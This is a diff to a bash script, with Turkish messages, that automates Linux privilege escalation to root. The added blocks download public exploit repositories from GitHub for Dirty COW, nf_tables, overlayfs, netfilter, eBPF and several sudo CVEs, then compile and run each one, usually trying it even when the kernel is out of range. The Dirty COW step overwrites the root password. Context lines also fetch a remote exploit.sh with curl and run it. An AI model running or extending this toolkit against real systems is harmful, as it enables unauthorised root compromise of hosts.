@@ -190,6 +190,32 @@ glibc_ge() { # compare against GLIBC var
     [ "$have" -ge "$need" ]
 }
 
+# --- sudo version compare ---
+SUDO_VER=""
+if command -v sudo >/dev/null 2>&1; then
+    SUDO_VER=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+fi
+sudover_num() {
+    local v=$(echo "$1" | grep -oE '^[0-9.]+')
+    local a b c
+    a=$(echo "$v" | cut -d. -f1)
+    b=$(echo "$v" | cut -d. -f2)
+    c=$(echo "$v" | cut -d. -f3)
+    printf "%d%02d%02d" "${a:-0}" "${b:-0}" "${c:-0}"
+}
+sudover_lt() {
+    [ -n "$SUDO_VER" ] || return 1
+    [ "$(sudover_num "$SUDO_VER")" -lt "$(sudover_num "$1")" ]
+}
+sudover_le() {
+    [ -n "$SUDO_VER" ] || return 1
+    [ "$(sudover_num "$SUDO_VER")" -le "$(sudover_num "$1")" ]
+}
+sudover_ge() {
+    [ -n "$SUDO_VER" ] || return 1
+    [ "$(sudover_num "$SUDO_VER")" -ge "$(sudover_num "$1")" ]
+}
+
 warn() { echo -e "${YELLOW}[!] $*${NC}"; }
 note() { echo -e "${GREEN}[+] $*${NC}"; }
 
@@ -228,7 +254,7 @@ out_shows_root() {
 }
 
 run() {
-    local cmd="$1" name="${2:-$1}"
+    local cmd="$1" name="${2:-$1}" SURE="${3:-90}"
     echo -e "${CYAN}[>] Deneniyor: $name${NC}"
     echo "==== $name :: $cmd ====" >> $LOGFILE
     local OUT=$WRK/.out.$$
@@ -238,7 +264,7 @@ run() {
         setsid bash -c "$RCMD" </dev/null >"$OUT" 2>&1 &
         local PID=$!
         local S=0
-        while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
+        while kill -0 $PID 2>/dev/null && [ $S -lt $SURE ]; do
             sleep 1; S=$((S+1))
         done
         if kill -0 $PID 2>/dev/null; then
@@ -260,7 +286,7 @@ run() {
             RC=$?
         fi
     elif [ "$HAS_TIMEOUT" = "1" ]; then
-        timeout -k 5 90 bash -c "$RCMD" </dev/null >"$OUT" 2>&1
+        timeout -k 5 $SURE bash -c "$RCMD" </dev/null >"$OUT" 2>&1
         RC=$?
     else
         bash -c "$RCMD" </dev/null >"$OUT" 2>&1
@@ -335,7 +361,7 @@ enum_scan() {
     fi
     echo ""
     echo -e "${CYAN}[CEKIRDEK ESLEMESI]${NC}"
-    for r in "5.8-5.16" "5.14-6.99" "6.1-6.6" "5.19-6.8" "5.10-5.17"; do
+    for r in "2.6.22-4.8" "4.4-4.14" "4.10-5.1" "5.4-5.6" "5.4-5.16" "5.7-5.8" "5.8-5.16" "5.8-6.1" "5.11-6.2" "5.14-6.6" "5.14-6.99" "6.1-6.6" "5.19-6.8" "5.10-5.17"; do
         in_krange "$r" && echo "  cekirdek $r araliginda"
     done
     echo ""
@@ -383,6 +409,12 @@ if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "
     fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp" "PwnKit-alt" || warn "Rvn0xsy/CVE-2021-4034 cekilemedi"
 fi
 
+# --- Dirty COW (CVE-2016-5195) ---
+in_krange "2.6.22-4.8" || warn "Dirty COW: cekirdek aralik disinda (< 4.8.3), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo firefart/dirtycow dcow && run "cd dcow && gcc -pthread -o dcow dirtycow.c -lcrypt && printf 'pwned123\n' | ./dcow && printf 'pwned123\n' | su -c id root" "Dirty COW" || warn "firefart/dirtycow cekilemedi"
+fi
+
 # --- Dirty Pipe (CVE-2022-0847) ---
 in_krange "5.8-5.16" || warn "Dirty Pipe: cekirdek aralik disinda (5.8-5.16), yine de deneniyor"
 if [ "$HAS_GCC" = "1" ]; then
@@ -393,6 +425,35 @@ fi
 if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
     note "Ubuntu + OverlayFS -> CVE-2023-2640 + CVE-2023-32629"
     run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && bash gameover.sh" "GameOverlay"
+fi
+
+# --- CVE-2024-1086 (nf_tables UAF) ---
+in_krange "5.14-6.6" || warn "CVE-2024-1086: cekirdek aralik disinda (5.14-6.6), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
+    note "nf_tables UAF -> CVE-2024-1086"
+    fetch_repo Notselwyn/CVE-2024-1086 c1086 && run "cd c1086 && make && ./exploit" "CVE-2024-1086" || warn "Notselwyn/CVE-2024-1086 cekilemedi"
+else
+    [ "$HAS_GCC" = "0" ] && warn "CVE-2024-1086 atlandi (gcc yok)" || warn "CVE-2024-1086 atlandi (CONFIG_NF_TABLES kapali)"
+fi
+
+# --- CVE-2022-0185 (fs_context heap overflow) ---
+in_krange "5.4-5.16" || warn "CVE-2022-0185: cekirdek aralik disinda (5.4-5.16), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ]; then
+    note "fs_context -> CVE-2022-0185"
+    fetch_repo Crusaders-of-Rust/CVE-2022-0185 c0185 && run "cd c0185 && make && ./exploit" "CVE-2022-0185" || warn "Crusaders-of-Rust/CVE-2022-0185 cekilemedi"
+fi
+
+# --- CVE-2023-0386 (overlayfs UAF) ---
+in_krange "5.11-6.2" || warn "CVE-2023-0386: cekirdek aralik disinda (5.11-6.2), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ] && [ "$OS" = "ubuntu" ]; then
+    note "overlayfs UAF -> CVE-2023-0386"
+    fetch_repo xkaneiki/CVE-2023-0386 c0386 && run "cd c0386 && make && ./exp" "CVE-2023-0386" || warn "xkaneiki/CVE-2023-0386 cekilemedi"
+fi
+
+# --- CVE-2021-3493 (Ubuntu overlayfs) ---
+if [ "$HAS_GCC" = "1" ] && [ "$OS" = "ubuntu" ]; then
+    note "Ubuntu overlayfs -> CVE-2021-3493"
+    fetch_repo briskets/CVE-2021-3493 c3493 && run "cd c3493 && gcc -o exp exploit.c && ./exp" "CVE-2021-3493" || warn "briskets/CVE-2021-3493 cekilemedi"
 fi
 
 # --- DirtyCred ---
@@ -411,6 +472,41 @@ fi
 in_krange "5.19-6.8" || warn "FragNesia: cekirdek aralik disinda (5.19-6.8), yine de deneniyor"
 if [ "$HAS_GCC" = "1" ]; then
     fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp" "FragNesia" || warn "v12-security/pocs cekilemedi"
+fi
+
+# --- CVE-2022-0995 (watch_queue) ---
+in_krange "5.8-5.16" || warn "CVE-2022-0995: cekirdek aralik disinda (5.8-5.16), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ]; then
+    note "watch_queue -> CVE-2022-0995"
+    fetch_repo Bonfee/CVE-2022-0995 c0995 && run "cd c0995 && make && ./exploit" "CVE-2022-0995" || warn "Bonfee/CVE-2022-0995 cekilemedi"
+fi
+
+# --- CVE-2022-34918 (nftables set UAF) ---
+in_krange "5.8-6.1" || warn "CVE-2022-34918: cekirdek aralik disinda (5.8-6.1), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
+    note "nftables set -> CVE-2022-34918"
+    fetch_repo veritas501/CVE-2022-34918 c34918 && run "cd c34918 && gcc -o exp exploit.c -lmnl -lnftnl && ./exp" "CVE-2022-34918" || warn "veritas501/CVE-2022-34918 cekilemedi"
+fi
+
+# --- CVE-2022-25636 (netfilter heap OOB) ---
+in_krange "5.4-5.6" || warn "CVE-2022-25636: cekirdek aralik disinda (5.4-5.6), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ]; then
+    note "netfilter OOB -> CVE-2022-25636"
+    fetch_repo Bonfee/CVE-2022-25636 c25636 && run "cd c25636 && make && ./exploit" "CVE-2022-25636" || warn "Bonfee/CVE-2022-25636 cekilemedi"
+fi
+
+# --- CVE-2019-13272 (PTRACE_TRACEME) ---
+in_krange "4.10-5.1" || warn "CVE-2019-13272: cekirdek aralik disinda (4.10-5.1), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ] && command -v pkexec >/dev/null 2>&1; then
+    note "PTRACE_TRACEME -> CVE-2019-13272"
+    fetch_repo bcoles/kernel-exploits c13272 && run "cd c13272/CVE-2019-13272 && gcc -Wall --std=gnu99 -s poc.c -o exp && ./exp" "CVE-2019-13272" || warn "bcoles/kernel-exploits cekilemedi"
+fi
+
+# --- CVE-2017-16995 (eBPF verifier) ---
+in_krange "4.4-4.14" || warn "CVE-2017-16995: cekirdek aralik disinda (4.4-4.14), yine de deneniyor"
+if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_BPF_SYSCALL; then
+    warn "CVE-2017-16995: dogrulanmamis repo, yine de deneniyor"
+    fetch_repo dangokyo/CVE_2017_16995 c16995 && run "cd c16995 && gcc -o exp exploit.c && ./exp" "CVE-2017-16995" || warn "dangokyo/CVE_2017_16995 cekilemedi"
 fi
 
 # --- eBPF Ring Buffer / Verifier LPE ---
@@ -461,13 +557,31 @@ fi
 if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
     note "PackageKit kurulu -> CVE-2026-41651"
     glibc_ge 2.33 || warn "41651: glibc $GLIBC < 2.33 (ikili GLIBC_2.33+ ister), yine de deneniyor"
-    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651" || warn "Vozec/CVE-2026-41651 cekilemedi"
+    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651" 120 || warn "Vozec/CVE-2026-41651 cekilemedi"
 fi
 
 # --- Polkit / DBus (CVE-2021-3560) ---
 if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
     note "Polkit mevcut -> CVE-2021-3560"
     fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py" "CVE-2021-3560" || warn "cybersecurityworks/CVE-2021-3560-Exploit-POC cekilemedi"
+fi
+
+# --- sudo Baron Samedit (CVE-2021-3156) ---
+if command -v sudo >/dev/null 2>&1 && sudover_lt 1.9.5p2; then
+    note "sudo < 1.9.5p2 -> CVE-2021-3156 (Baron Samedit)"
+    fetch_repo blasty/CVE-2021-3156 b3156 && run "cd b3156 && make && ./sudo-hax-me-a-sandwich 0" "CVE-2021-3156" || warn "blasty/CVE-2021-3156 cekilemedi"
+fi
+
+# --- sudoedit (CVE-2023-22809) ---
+if command -v sudo >/dev/null 2>&1 && sudover_ge 1.8.0 && sudover_le 1.9.12p1; then
+    note "sudo 1.8.0-1.9.12p1 -> CVE-2023-22809 (sudoedit)"
+    fetch_repo n3m1sys/CVE-2023-22809-sudoedit-privesc c22809 && run "cd c22809 && bash exploit.sh" "CVE-2023-22809" || warn "n3m1sys/CVE-2023-22809-sudoedit-privesc cekilemedi"
+fi
+
+# --- sudo pwfeedback (CVE-2019-18634) ---
+if command -v sudo >/dev/null 2>&1 && sudover_ge 1.8.26 && sudover_le 1.8.31; then
+    note "sudo 1.8.26-1.8.31 -> CVE-2019-18634 (pwfeedback)"
+    fetch_repo saleemrashid/sudo-cve-2019-18634 c18634 && run "cd c18634 && make && ./exploit" "CVE-2019-18634" || warn "saleemrashid/sudo-cve-2019-18634 cekilemedi"
 fi
 
 # --- runc Container Breakout (CVE-2024-21626) ---
